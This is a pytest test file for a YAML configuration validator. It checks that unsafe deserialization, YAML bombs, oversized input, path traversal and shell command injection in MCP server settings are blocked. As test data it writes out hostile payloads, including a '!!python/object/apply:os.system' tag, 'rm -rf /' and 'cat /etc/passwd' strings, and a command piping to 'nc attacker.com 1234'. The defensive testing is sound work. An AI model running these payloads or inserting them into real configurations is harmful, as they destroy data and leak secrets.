"""Security tests for YAML injection prevention (T109).

Tests validation of YAML configurations to prevent:
- Arbitrary code execution via unsafe YAML loading
- YAML bombs (nested structures causing DoS)
- Directory traversal in file paths
- Template injection attacks

OWASP A03:2021 - Injection Prevention
"""

import pytest
import tempfile
from pathlib import Path

from promptchain.cli.security.yaml_validator import (
    YAMLValidator,
    ValidationError,
    validate_yaml_file,
)


class TestYAMLInjectionPrevention:
    """Test YAML injection attack prevention."""

    def test_safe_yaml_loading_only(self, tmp_path):
        """Test that only yaml.safe_load() is used (no arbitrary code execution)."""
        # Attempt Python object serialization (would work with yaml.load, blocked by safe_load)
        malicious_yaml = """
!!python/object/apply:os.system
args: ['echo pwned > /tmp/pwned.txt']
"""
        yaml_file = tmp_path / "malicious.yml"
        yaml_file.write_text(malicious_yaml)

        validator = YAMLValidator()

        # Should fail with safe_load (no Python objects allowed)
        with pytest.raises((ValidationError, Exception)):
            validator.load_and_validate(yaml_file)

    def test_code_execution_patterns_blocked(self, tmp_path):
        """Test that code execution patterns in strings are blocked."""
        malicious_configs = [
            # Python imports
            """
agents:
  hacker:
    model: openai/gpt-4
    instruction_chain:
      - "__import__('os').system('rm -rf /')"
""",
            # Python exec
            """
agents:
  hacker:
    model: openai/gpt-4
    instruction_chain:
      - "exec('import os; os.system(\"ls\")')"
""",
            # Python eval
            """
agents:
  hacker:
    model: openai/gpt-4
    instruction_chain:
      - "eval('__import__(\"os\").system(\"whoami\")')"
""",
            # OS commands
            """
agents:
  hacker:
    model: openai/gpt-4
    instruction_chain:
      - "os.system('cat /etc/passwd')"
""",
            # Subprocess
            """
agents:
  hacker:
    model: openai/gpt-4
    instruction_chain:
      - "subprocess.call(['rm', '-rf', '/'])"
""",
        ]

        validator = YAMLValidator()

        for i, malicious_yaml in enumerate(malicious_configs):
            yaml_file = tmp_path / f"malicious_{i}.yml"
            yaml_file.write_text(malicious_yaml)

            with pytest.raises(ValidationError) as exc_info:
                validator.load_and_validate(yaml_file)

            # Severity should be critical, high, or medium (all serious security issues)
            assert exc_info.value.severity in ("critical", "high", "medium")

    def test_yaml_bomb_prevention(self, tmp_path):
        """Test that YAML bombs (deeply nested structures) are blocked."""
        # Create properly nested YAML that exceeds depth
        deep_yaml = """
agents:
  test:
    model: openai/gpt-4
    level1:
      level2:
        level3:
          level4:
            level5:
              level6:
                level7:
                  level8:
                    level9:
                      level10:
                        level11: too deep
"""
        yaml_file = tmp_path / "deep.yml"
        yaml_file.write_text(deep_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        # Should be blocked for depth or invalid keys
        assert exc_info.value.severity in ("high", "medium")

    def test_oversized_yaml_blocked(self, tmp_path):
        """Test that oversized YAML files are blocked (DoS prevention)."""
        # Create YAML larger than max_file_size
        oversized_yaml = "agents:\n"
        oversized_yaml += "  hacker:\n"
        oversized_yaml += "    model: openai/gpt-4\n"
        oversized_yaml += "    description: '" + ("A" * (2 * 1024 * 1024)) + "'\n"  # 2MB string

        yaml_file = tmp_path / "oversized.yml"
        yaml_file.write_text(oversized_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "too large" in str(exc_info.value).lower()

    def test_oversized_collection_blocked(self, tmp_path):
        """Test that collections with too many entries are blocked."""
        # Create YAML with too many agents (exceeds max_collection_size)
        large_yaml = "agents:\n"
        for i in range(150):  # Exceeds default max_collection_size=100
            large_yaml += f"  agent{i}:\n"
            large_yaml += f"    model: openai/gpt-4\n"

        yaml_file = tmp_path / "large.yml"
        yaml_file.write_text(large_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "too large" in str(exc_info.value).lower()

    def test_invalid_top_level_keys_blocked(self, tmp_path):
        """Test that invalid top-level keys are blocked (whitelist approach)."""
        invalid_yaml = """
agents:
  researcher:
    model: openai/gpt-4
malicious_key:
  evil_config: "pwned"
"""
        yaml_file = tmp_path / "invalid.yml"
        yaml_file.write_text(invalid_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "invalid" in str(exc_info.value).lower()
        assert "malicious_key" in str(exc_info.value).lower()

    def test_dangerous_mcp_command_blocked(self, tmp_path):
        """Test that dangerous characters in MCP commands are blocked."""
        dangerous_commands = [
            "npx mcp-server | nc attacker.com 1234",  # Pipe
            "npx mcp-server; rm -rf /",  # Semicolon
            "npx mcp-server && cat /etc/passwd",  # AND
            "npx mcp-server `whoami`",  # Backticks
            "npx mcp-server $(whoami)",  # Command substitution
        ]

        validator = YAMLValidator()

        for i, cmd in enumerate(dangerous_commands):
            malicious_yaml = f"""
mcp_servers:
  - id: evil
    type: stdio
    command: "{cmd}"
"""
            yaml_file = tmp_path / f"dangerous_cmd_{i}.yml"
            yaml_file.write_text(malicious_yaml)

            with pytest.raises(ValidationError) as exc_info:
                validator.load_and_validate(yaml_file)

            assert exc_info.value.severity == "critical"

    def test_valid_yaml_passes(self, tmp_path):
        """Test that valid YAML passes all validations."""
        valid_yaml = """
mcp_servers:
  - id: filesystem
    type: stdio
    command: npx
    args: ["@modelcontextprotocol/server-filesystem"]

agents:
  researcher:
    model: openai/gpt-4
    description: "Research specialist"
    instruction_chain:
      - "Analyze: {input}"
    tools: ["web_search"]

orchestration:
  execution_mode: router
  default_agent: researcher

session:
  auto_save_interval: 300
  max_history_entries: 50

preferences:
  verbose: true
  theme: dark
"""
        yaml_file = tmp_path / "valid.yml"
        yaml_file.write_text(valid_yaml)

        validator = YAMLValidator()
        config = validator.load_and_validate(yaml_file)

        # Should successfully parse
        assert "agents" in config
        assert "researcher" in config["agents"]

    def test_string_length_limit(self, tmp_path):
        """Test that excessively long strings are blocked."""
        long_string = "A" * 15000  # Exceeds default max_string_length=10000

        long_yaml = f"""
agents:
  hacker:
    model: openai/gpt-4
    description: "{long_string}"
"""
        yaml_file = tmp_path / "long_string.yml"
        yaml_file.write_text(long_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "too long" in str(exc_info.value).lower()

    def test_mcp_server_type_validation(self, tmp_path):
        """Test that MCP server type is validated (whitelist)."""
        invalid_yaml = """
mcp_servers:
  - id: evil
    type: malicious_type
    command: npx
"""
        yaml_file = tmp_path / "invalid_type.yml"
        yaml_file.write_text(invalid_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "type" in str(exc_info.value).lower()

    def test_identifier_validation(self, tmp_path):
        """Test that identifiers with special characters are blocked."""
        invalid_yaml = """
mcp_servers:
  - id: "../../etc/passwd"
    type: stdio
    command: npx
"""
        yaml_file = tmp_path / "invalid_id.yml"
        yaml_file.write_text(invalid_yaml)

        validator = YAMLValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator.load_and_validate(yaml_file)

        assert "identifier" in str(exc_info.value).lower()

    def test_convenience_function(self, tmp_path):
        """Test validate_yaml_file convenience function."""
        valid_yaml = """
agents:
  test:
    model: openai/gpt-4
"""
        yaml_file = tmp_path / "test.yml"
        yaml_file.write_text(valid_yaml)

        # Should work without creating validator instance
        config = validate_yaml_file(yaml_file)
        assert "agents" in config


class TestYAMLValidatorCustomization:
    """Test YAMLValidator with custom limits."""

    def test_custom_limits(self, tmp_path):
        """Test validator with custom security limits."""
        # Create validator with stricter limits
        strict_validator = YAMLValidator(
            max_file_size=1024,  # 1KB
            max_depth=3,
            max_string_length=100,
            max_collection_size=5,
        )

        # This should fail with strict limits
        yaml_content = """
agents:
  agent1:
    model: openai/gpt-4
    description: "This is a longer description that exceeds the string length limit of 100 characters for testing purposes"
"""
        yaml_file = tmp_path / "strict.yml"
        yaml_file.write_text(yaml_content)

        with pytest.raises(ValidationError):
            strict_validator.load_and_validate(yaml_file)

    def test_depth_limit_configurable(self, tmp_path):
        """Test that depth limit is configurable."""
        # Create shallow YAML (depth 5)
        shallow_yaml = """
agents:
  test:
    model: openai/gpt-4
    history_config:
      enabled: true
"""
        yaml_file = tmp_path / "shallow.yml"
        yaml_file.write_text(shallow_yaml)

        # Should pass with default depth limit
        default_validator = YAMLValidator()
        config = default_validator.load_and_validate(yaml_file)
        assert "agents" in config

        # Should fail with very strict depth limit
        strict_validator = YAMLValidator(max_depth=2)
        with pytest.raises(ValidationError):
            strict_validator.load_and_validate(yaml_file)
